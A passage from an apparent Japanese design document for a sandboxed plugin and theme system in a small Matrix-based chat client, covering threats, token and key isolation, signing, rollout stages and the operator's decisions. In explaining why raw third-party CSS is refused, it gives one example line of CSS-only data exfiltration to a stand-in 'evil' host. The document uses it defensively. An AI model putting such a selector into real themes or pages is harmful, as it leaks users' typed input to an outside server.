2. **侵害された配布元** — GitHub 等の配布チャネル自体が乗っ取られるケース。native 版の更新配布で
   `native-milestones.md` M2 がすでに設計している「無署名 electron-updater は GitHub アカウント
   乗っ取りに無防備」という同種の懸念がプラグイン配布にもそのまま当てはまる。
3. **友人間の共有** (~10 人規模の運用では最も現実的なモード) — 「これ便利だよ」で友人から
   プラグイン/テーマファイルを直接受け取ってインストールする、BetterDiscord/Vencord の
   `userplugins/` 的な非公式流通。**この経路は信頼関係があるから安全、と考えないことが重要**
   — Phantom in the Vault (§3.3) は「信頼できる相手からの正規機能」の悪用だった。

### 6.2 トークン・E2EE 鍵への到達を構造的に断つ設計

- プラグイン実行コンテキストには **`MatrixClient` インスタンス・アクセストークン・E2EE 鍵ストアへの
  参照を一切渡さない**。widget 機構の `CallWidgetDriver` と同じく、これらを保持するのはホスト側の
  `PluginDriver` だけであり、プラグインから見えるのは capability で許可された narrow なメソッドの
  戻り値だけ。
- **§3.6 の同一オリジンの穴を再現しない**ことを設計原則として明記する。EC は自前の一次コードだから
  「同一オリジン + `allow-same-origin`」でも実害がないが、サードパーティのプラグインコードに対しては
  これは無防備と同義。プラグインのホスティングは genuinely 別オリジン (web: 別ポート/別サブドメイン、
  native: 別 origin scheme または `allow-same-origin` を落とした sandbox) にする。
- ルームアクセスはルーム単位でスコープする (「全ルーム見放題」を既定にしない)。E2EE ルームの
  復号済み平文を渡す capability は、渡した瞬間にそのルームの機密性がプラグインの信頼性に従属する
  ことを UI 上でも明示する (「このプラグインはこのルームの会話内容を読み取れます」)。

### 6.3 権限プロンプト

- インストール時に capability 一覧を人間が読める文言で表示 (ブラウザ拡張のインストール画面が
  参考になる)。
- capability が増えるアップデートは自動更新せず再同意を要求する。
- 「セーフモード」(全プラグイン一括無効化) を常時 1 クリックで到達可能にする。

### 6.4 署名・検証

- `native-milestones.md` M2 で設計済みの **minisign (Ed25519) 鍵運用をそのまま転用する**:
  運用者の手元だけにある秘密鍵でプラグイン索引/マニフェストに署名し、アプリは埋め込み公開鍵で
  検証してから読み込む。これにより「GitHub アカウントが乗っ取られても署名なしにプラグインを
  差し替えて配れない」という同じ保証をプラグイン配布にも及ぼせる (鍵ペアの再利用であり、
  新しい鍵運用を増やさない)。
- 自作/未署名プラグインは明示的な「開発者モード」トグルの配下でのみ読み込み可能にする
  (VS Code の「発行元を信頼するか」プロンプトや Obsidian の制限モードと同じ、
  「既定は安全、必要な人だけ手動で穴を開ける」の形)。

### 6.5 web 版との差

- プラグインの**実行サンドボックス自体** (iframe/Worker + capability API) は web/native どちらでも
  同じ仕組みで動く。native 固有の技術的必然性はない (§4 表)。したがって
  web-native-parallel.md の R1 (既定は共通コード) に従えば「web にも載せる」が自然な帰結になる。
- ただし web-native-parallel.md 自体が「web 版は誰でもログイン画面に到達できる公開面であり、
  守る対象が 1 つ増えている」と明記している通り、**「未知の友人が web の公開ビルドで安易に
  野良プラグインを入れる」経路の是非は、実行サンドボックスの技術的な健全性とは別に運用者が
  判断すべき論点**として §8 の確認事項に残す。
  提案: v1 は「運用者キュレーションの同梱プラグインのみ」なので web/native どちらでもリスクは
  同程度に抑えられるが、**任意の未キュレーションプラグインを個人が追加インストールできる機能は
  native 限定にする**のが妥当な落とし所ではないか (technical には可能だが、native の方が
  「配布制で見知らぬ第三者が直接触れない」という前提と馴染む)。

---

## 7. 段階導入の推奨案

`native-milestones.md` の M0〜M4 (native 化) とは独立した後続の取り組みとして位置づけ、
ここでは「M5 相当」として仮に呼ぶ (実際のマイルストーン番号は requirements.md/roadmap.md 改訂時に
運用者が確定)。

| 段階 | 内容 | 対象 (web/native) | 備考 |
| --- | --- | --- | --- |
| **M5a** | テーマの宣言的トークン開放 (§5.1-1) | 両方 | 最も低リスク・低工数。先行実装候補 |
| **M5b** | フィルタの宣言的パラメータ化 + 並べ替え UI (§5.2、ビルトインノードのみ) | 両方 | 既存の `TrackProcessor` 差し込み点を一般化するだけで、新規実行環境は不要 |
| **M5c** | プラグイン基盤 v0 (§5.3、widget capability モデル流用のサンドボックス、運用者キュレーションのみ配布) | まず native、web は§6.5 の判断待ち | セキュリティ投資が最も要る箇所。ここで minisign 署名運用も接続 |
| **M6+ (LATER)** | 生カスタム CSS テーマ (§5.1-2)、ユーザー独自のフィルタコード実行 (AudioWorklet、§5.2 末尾)、プラグインの公開マーケットプレイス化の是非検討 | 要議論 | それぞれ独立に「必要になってから」検討してよい |
| **明示的な非対応** | 選択肢 A (BetterDiscord 型の非サンドボックス JS 注入) | — | 当面まったくやらない。将来検討する場合も本ドラフトの脅威モデル整理を土台にする |

---

## 8. 運用者への確認事項リスト

1. **プラグインは友達に配る前提か、自分専用か。** 前提によって「配布の信頼モデル」の設計density が
   変わる (自分専用なら §6.4 の署名検証は簡略化できる余地がある)。
2. **コード実行をどこまで許すか。** §5.3 の capability ベースサンドボックス (選択肢 B) を基本線として
   進めてよいか、それとも当面はテーマ/フィルタの宣言的カスタム (選択肢 C) だけに絞り、プラグインの
   コード実行自体を先送りするか。
3. **web 版にもプラグイン機能を載せるか。** §6.5 で「実行サンドボックスは web/native 共通でよいが、
   未キュレーションプラグインの個人インストールは native 限定にする」を提案したが、この切り分けで
   よいか。
4. **テーマは宣言的トークンだけで十分か、生カスタム CSS (§5.1-2) までいずれ欲しいか。** 後者は
   フィッシング的な見た目偽装のリスクが残る (§5.1-2 参照) 前提での要否確認。
   → **回答済み (2026-07-08): 配布テーマはトークンのみで確定** (下記「運用者の回答」参照)。
5. **プラグインのキュレーション/レビューは当面運用者 1 人が担うことになるが、それでよいか。**
   (バス因子・運用者の作業時間コストの問題。Obsidian/Vencord のような「コミュニティレビュー」への
   移行は当面考えなくてよいか)
6. **フィルタのユーザー独自コード実行 (AudioWorklet、§5.2 末尾) を将来要件に含めるか、
   宣言的パラメータ化だけで OBS フィルタ体験として十分と考えるか。**
7. **セーフモード (全プラグイン一括無効化) を M5c の必須要件に含めてよいか。** (§6.3、工数は小さいが
   明示的な合意を取っておきたい)

---

### 運用者の回答 (2026-07-08)

| 問 | 回答 | 設計への影響 |
| --- | --- | --- |
| (1) 配布範囲 | **他人が作って他人 (制作者以外) が使う想定** | 想定より広い = エコシステム型。サンドボックス + 署名/インデックスが「あれば良い」から**必須級**に格上げ |
| (2) コード実行 | **サンドボックス内のみ** (推奨案どおり) | capability 型で確定。BetterDiscord 型は不採用で確定 |
| (3) web/native | **差分は少なくあって欲しい。対応できる範囲で web にも** | 中核 (サンドボックス実行・権限交渉・テーマ) は web 互換で設計し、native 限定は「原理的に web 不可」(ネイティブ音声フィルタ等) のみ — 併走ルール (web-native-parallel.md) と同じ原則を適用 |
| (4) テーマの生 CSS | **配布テーマはトークンのみで確定** (2026-07-08。運用者の逆質問への回答提示後)。生 CSS の一般配布は当面不採用 | 第三者配布テーマは色/角丸/フォント等の**定義済み変数セットのみ**。任意 CSS セレクタ・`url()` は受け付けない。自分専用のローカル生 CSS 枠を将来設けるかは LATER (設けるなら外部 url() 禁止 = local/data: のみが最低条件) |

**(4) の確定根拠 (逆質問「UI 偽装は何が怖い？fork の UI 変更と何が違う？」への回答)**: 違いは
**コードの信頼レベル**。fork の UI 変更は運用者作・レビュー済み・署名付き配布物の一部でアプリ本体と
同格の信頼。第三者の生 CSS は「他人の入力がセキュリティ表面に直接適用される」ことを意味し、具体的な
危険は (a) セキュリティ表示の隠蔽 (E2EE 検証警告・画面共有中インジケータ・端末認証プロンプトの
不可視化/誤誘導)、(b) 操作の偽装 (危険なボタンを無害な見た目に)、(c) **CSS 単体でのデータ漏洩**
(`input[value^="a"]{background:url(https://evil/a)}` の属性セレクタ + 外部 url() で入力値を 1 文字ずつ
外部送信する既知技法。JS 不要)。トークンのみなら (a)(b)(c) すべて構造的に発生しない。
| (5) キュレーション | (推奨継続、異議あれば変更) 運用者署名 (minisign 流用) 付きの小規模インデックス + 未署名は強警告付き手動インストール | 配布範囲 (1) の回答により重要度上昇 |
| (6) フィルタの自作コード | (推奨継続) v1 はパラメータのみ。AudioWorklet 自作枠は将来検討 (AudioWorkletGlobalScope の隔離特性が良いため道は残す) | — |
| (7) セーフモード | (推奨継続) v1 必須 — プラグイン全無効で起動する導線 | — |

**(4) への回答骨子 (2026-07-08、チャットで運用者へ提示)**: fork の UI 変更と第三者テーマの生 CSS は
**信頼レベルが違う**。fork の変更は運用者作・レビュー済み・署名付き配布物の一部 = アプリ本体と同じ信頼。
第三者の生 CSS は「他人の入力がセキュリティ表面に直接適用される」ことを意味し、具体的な怖さは:
(a) セキュリティ表示の隠蔽 (E2EE 検証警告・画面共有中インジケータ・端末認証プロンプトを不可視化/誤誘導)、
(b) 操作の偽装 (危険なボタンを無害な見た目にする)、(c) **CSS 単体でのデータ漏洩**
(属性セレクタ + 外部 url() 背景画像で入力値を 1 文字ずつ外部送信する既知技法 — JS 不要)。
対策するなら最低限「外部 url() の禁止 (local/data: のみ)」が必須。それでも (a)(b) は防げないため、
**他人作テーマはトークンのみ / 生 CSS は自分で書いて自分で入れるローカル枠のみ**が推奨案。

## 9. この検討が確定したら変わる文書

- requirements.md への新セクション追加 (クライアントのカスタム機構としての要件定義)。
- roadmap.md への新フェーズ追加 (M5 相当のテーマ/フィルタ/プラグイン段階導入)。
- `native-milestones.md` M2 の minisign 鍵運用ドキュメントへ「プラグイン配布にも同じ鍵を使う」旨の
  相互参照を追記。
